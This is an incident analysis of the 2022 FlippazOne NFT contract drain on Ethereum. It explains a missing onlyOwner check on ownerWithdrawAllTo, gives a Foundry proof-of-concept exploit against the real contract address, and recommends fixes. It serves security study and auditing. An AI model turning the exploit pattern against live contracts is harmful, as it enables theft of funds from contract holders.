# FlippazOne — Unauthorized Withdrawal Function Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-07-10 |
| **Protocol** | FlippazOne (NFT Mint) |
| **Chain** | Ethereum Mainnet |
| **Loss** | All ETH held by the contract |
| **Attacker** | Address unconfirmed |
| **Vulnerable Contract** | [0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944](https://etherscan.io/address/0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944) |
| **Root Cause** | `ownerWithdrawAllTo()` function lacks access control, allowing any address to drain all funds |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/FlippazOne_exp.sol) |

---
## 1. Vulnerability Overview

FlippazOne is an Ethereum NFT minting contract designed to receive ETH via the `bid()` function. Despite its name containing "owner", the `ownerWithdrawAllTo(address)` function had no access control modifier such as `onlyOwner` applied whatsoever. The attacker deposited 2 ETH via `bid()`, then called `ownerWithdrawAllTo(attacker)` to drain the contract's entire balance to their own address.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable withdrawal function — no access control
function ownerWithdrawAllTo(address recipient) external {
    // ❌ No onlyOwner modifier → callable by anyone
    (bool success, ) = recipient.call{value: address(this).balance}("");
    require(success, "Transfer failed");
}

// Deposit function — receives ETH normally
function bid() external payable {
    // bid logic...
}

// ✅ Correct pattern
function ownerWithdrawAllTo(address recipient) external onlyOwner {
    // ✅ onlyOwner modifier restricts calls to the contract owner only
    (bool success, ) = recipient.call{value: address(this).balance}("");
    require(success, "Transfer failed");
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**FlippazOne.sol** — Entry point:
```solidity
// ❌ Root cause: `ownerWithdrawAllTo()` function lacks access control, allowing any address to drain all funds
    function ownerWithdrawAllTo(address toAddress) public  {
        (bool success, ) = toAddress.call{value: address(this).balance}("");  // ❌ Arbitrary external call
        require(success, "Failed to withdraw funds.");
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (alice)
    │
    ├─[1] bid{value: 2 ether}()
    │       └─ Contract balance: existing holdings + 2 ETH
    │
    ├─[2] ownerWithdrawAllTo(alice)
    │       └─ ❌ No access control → callable by anyone
    │           └─ Transfers address(this).balance in full to alice
    │
    └─[3] Contract balance = 0, alice balance += total holdings
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IFlippaz {
    function bid() external payable;
    function ownerWithdrawAllTo(address recipient) external;  // ❌ No access control
}

contract FlippazExploit is Test {
    IFlippaz flippaz = IFlippaz(0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944);
    address alice = makeAddr("alice");

    function setUp() public {
        vm.createSelectFork("mainnet", 15_083_765);
        vm.deal(alice, 10 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] FlippazOne ETH balance",
            address(flippaz).balance,
            18
        );

        // [Step 1] Attacker bids 2 ETH
        vm.prank(alice);
        flippaz.bid{value: 2 ether}();

        emit log_named_decimal_uint(
            "[After bid] FlippazOne ETH balance",
            address(flippaz).balance,
            18
        );

        // [Step 2] Call ownerWithdrawAllTo with no access control
        // Callable by anyone without onlyOwner → drains entire balance
        vm.prank(alice);
        flippaz.ownerWithdrawAllTo(alice);

        emit log_named_decimal_uint(
            "[After attack] FlippazOne ETH balance",
            address(flippaz).balance,
            18
        );
        emit log_named_decimal_uint(
            "[After attack] Alice ETH balance",
            alice.balance,
            18
        );

        // Verify contract balance is now 0
        assertEq(address(flippaz).balance, 0);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Unauthorized Fund Withdrawal |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Missing Access Control |
| **Attack Vector** | Missing `onlyOwner` on `ownerWithdrawAllTo()` function |
| **Precondition** | Contract holds an ETH balance |
| **Impact** | Complete ETH balance of the contract drained |

---
## 6. Remediation Recommendations

1. **Mandatory `onlyOwner` modifier**: All fund-movement functions must have `onlyOwner` or role-based access control (RBAC) applied.
2. **Verify function name matches permissions**: During audits, confirm that functions whose names contain "owner", "admin", "operator", etc. actually implement the corresponding permission check.
3. **Use OpenZeppelin Ownable**: Using a battle-tested library reduces the risk of mistakes in access control logic.

```solidity
// ✅ Fixed contract
import "@openzeppelin/contracts/access/Ownable.sol";

contract FlippazOne is Ownable {
    function bid() external payable { /* ... */ }

    // ✅ onlyOwner restricts calls to the owner only
    function ownerWithdrawAllTo(address recipient) external onlyOwner {
        (bool success, ) = recipient.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}
```

---
## 7. Lessons Learned

- **Never assume security from a name alone**: A function named `ownerXxx()` expresses intent only — actual access control must be enforced in code.
- **All fund-movement functions require an access control audit**: Every function that transfers ETH or tokens externally must be reviewed before deployment to verify that access control modifiers are correctly applied.
- **Simple yet critical vulnerability**: This attack is completed with just two function calls. It demonstrates that violating the most fundamental security principles can lead to massive losses.